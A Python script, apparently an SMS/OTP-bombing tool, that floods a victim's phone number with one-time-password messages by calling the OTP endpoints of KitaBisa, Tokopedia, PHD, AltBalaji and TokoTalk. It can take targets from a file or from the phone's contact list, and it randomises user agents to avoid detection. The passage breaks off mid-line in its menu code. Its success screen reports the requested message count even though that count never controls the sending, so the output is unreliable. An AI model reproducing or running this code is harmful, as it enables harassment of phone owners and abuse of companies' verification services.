#!/usr/bin/python
import requests, random, json, time, sys, os, re

# -----------------------CORES----------------------------
p = '\x1b[0m'
m = '\x1b[91m'
h = '\x1b[92m'
k = '\x1b[93m'
b = '\x1b[94m'
u = '\x1b[95m'
bm = '\x1b[96m'
bgm = '\x1b[41m'
bgp = '\x1b[47m'
res = '\x1b[40m'

# ------------------------Classes------------------------
class spam:
    def __init__(self, nomer):
        self.nomer = nomer

    def spam(self):
        hasil = requests.get(f'https://core.ktbs.io/v2/user/registration/otp/{self.nomer}')
        if hasil.status_code == 200:
            return True
        else:
            return False

    def tokped(self):
        rands = random.choice(open('ua.txt').readlines()).split('\n')[0]
        kirim = {
            'User-Agent': rands,
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Origin': 'https://accounts.tokopedia.com',
            'Accept': 'application/json, text/javascript, */*; q=0.01',
            'X-Requested-With': 'XMLHttpRequest',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'
        }
        regist = requests.get(
            'https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=' + self.nomer,
            headers=kirim
        ).text
        try:
            Token = re.search(r'<input id="Token" value="(.*?)" type="hidden">', regist).group(1)
        except:
            Token = ''
        formulir = {
            "otp_type": "116",
            "msisdn": self.nomer,
            "tk": Token,
            "email": '',
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        req = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers=kirim, data=formulir).text
        if 'Anda sudah melakukan 3 kali pengiriman kode' in req:
            return False
        else:
            return True

    def phd(self):
        param = {'phone_number': self.nomer}
        r = requests.post('https://www.phd.co.id/en/users/sendOTP', data=param)
        if 'We have sent an OTP to your phone' in r.text:
            return True
        else:
            return False

    def balaji(self):
        urlb = "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=ID"
        kod = "62"
        ata = {"country_code": kod, "phone_number": self.nomer}
        head = {
            "Content-Length": f"{len(str(ata))}",
            "Accept": "application/json, text/plain, */*",
            "Origin": "https://lite.altbalaji.com",
            "Save-Data": "on",
            "User-Agent": "Mozilla/5.0",
            "Content-Type": "application/json;charset=UTF-8",
            "Referer": "https://lite.altbalaji.com/subscribe?progress=input",
        }
        req = requests.post(urlb, data=json.dumps(ata), headers=head).text
        return True if '{"status":"ok"}' in req else False

    def TokoTalk(self):
        data = '{"key":"phone","value":"' + str(self.nomer) + '"}'
        head = {"User-Agent": "Mozilla/5.0", "content-type": "application/json;charset=UTF-8"}
        return True if 'expireAt' in requests.post("https://api.tokotalk.com/v1/no_auth/verifications", data=data, headers=head).text else False

# ------------------------Funções------------------------
def loading(msg='Processando', total=50):
    print()
    for i in range(total + 1):
        time.sleep(0.02)
        sys.stdout.write(f'\r{h}{msg}: [{"#"*i}{" "*(total-i)}] {i*2}%')
        sys.stdout.flush()
    print('\n')

def mostrar_resultado(destino, quantidade):
    print(h + '╔' + '═'*30 + '╗')
    print(h + f'║  ✅ SPAM ENVIADO COM Sucesso!      ║')
    print(h + f'║                                  ║')
    print(h + f'║  🔹 Destino: {destino}{" "*(15-len(destino))}║')
    print(h + f'║  📊 Quantidade: {quantidade}{" "*(10-len(str(quantidade)))}║')
    print(h + f'║  ✉️ Enviadas: {quantidade}{" "*(14-len(str(quantidade)))}║')
    print(h + f'║                                  ║')
    print(h + f'║  📌 DOCTOR CORINGA LUNÁTICO         ║')
    print(h + '╚' + '═'*30 + '╝\n')
    input(h+'Pressione ENTER para continuar...')

def executar_envio(numeros, quantidade, metodo):
    for n in numeros:
        loading(f'Enviando para {n}')
        sp = spam(n)
        sucesso = False
        if metodo == 'ktbs': sucesso = sp.spam()
        elif metodo == 'tkpd': sucesso = sp.tokped()
        elif metodo == 'pehd': sucesso = sp.phd()
        elif metodo == 'blji': sucesso = sp.balaji()
        elif metodo == 'ttk': sucesso = sp.TokoTalk()
        elif metodo == 'smua':
            sp.spam(); sp.tokped(); sp.balaji(); sp.phd(); sp.TokoTalk()
            sucesso = True
    mostrar_resultado(', '.join(numeros), quantidade)

# -------------------------Função Principal-----------------
def single():
    numero = input(k+'\tPhone number : '+h)
    quantidade = int(input(k+'\tTotal spam : '+h))
    executar_envio([numero], quantidade, jns)

def multi():
    numeros = []
    total = int(input(k+'\tTotal numbers : '+h))
    for i in range(total):
        numeros.append(input(k+f'\tNumber -{i+1} : '+h))
    quantidade = int(input(k+'\tTotal spam : '+h))
    executar_envio(numeros, quantidade, jns)

def files():
    fil = input(k+'\tFile : '+h)
    if fil in os.listdir(os.getcwd()):
        numeros = [x.strip() for x in open(fil).readlines()]
        quantidade = int(input(k+'\tTotal spam : '+h))
        executar_envio(numeros, quantidade, jns)
    else:
        print(m+f'\tFile {fil} doesn`t exist')

def termux():
    os.system('termux-contact-list > .contact')
    po = json.loads(open('.contact','r').read())
    for idx, contato in enumerate(po):
        print(m+str(idx+1)+' '+k+contato['name'])
    idx = int(input(u+'\tchoose > '+h)) - 1
    numeros = [po[idx]['number']]
    quantidade = int(input(u+'\tTotal spam : '+h))
    executar_envio(numeros, quantidade, jns)

# -------------------------Banner e Menu-----------------
def logo():
    os.system('clear')
    print(h+"""
██████╗  ██████╗  ██████╗ ██████╗ ██████╗  █████╗ ███╗   ██╗
██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██╔══██╗██╔══██╗████╗  ██║
██████╔╝██║   ██║██║   ██║██████╔╝██████╔╝███████║██╔██╗ ██║
██╔═══╝ ██║   ██║██║   ██║██╔═══╝ ██╔═══╝ ██╔══██║██║╚██╗██║
██║     ╚██████╔╝╚██████╔╝██║     ██║     ██║  ██║██║ ╚████║
╚═╝      ╚═════╝  ╚═════╝ ╚═╝     ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝
""")

def jnspam():
    global jns
    logo()
    print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'SPAM '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Exit\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'1'+m+'』 '+bm+'All\n'+b+'║'+m+'『'+h+'2'+m+'』 '+bm+'PHD\n'+b+'║'+m+'『'+h+'3'+m+'』 '+bm+'KitaBisa\n'+b+'║'+m+'『'+h+'4'+m+'』 '+bm+'Tokopedia\n'+b+'║'+m+'『'+h+'5'+m+'』 '+bm+'TokoTalk\n'+b+'║'+m+'『'+h+'6'+m+'』 '+bm+'Balaji\n'+b+'╠══════════════════════════════')
    while True:
        oy = input(b+'╚══'+m+'〙'+u+'Spam'+m+' ▶ '+h)
        if oy in ['1','01']: jns='smua'; break
        elif oy in ['2','02']: jns='pehd'; break
        elif oy in ['3','03']: jns='ktbs'; break
        elif oy in ['4','04']: jns='tkpd'; break
        elif oy in ['5','05']: jns='ttk'; break
        elif oy in ['6','06']: jns='blji'; break
        elif oy in ['0','00']: sys.exit()
        else: print(m+'             Don`t leave it blank')
    main()

def main():
    logo()
    print(b+'╔══════════════════════════════\n'+b+'║'+h+'〘 '+m+'MODE '+h+'〙\n'+b+'╠══════════════════════════════'+b+'\n║'+m+'『'+h+'▣'+m+'』'+bm+' Back\n'+b+'╠══════════════════════════════'+b
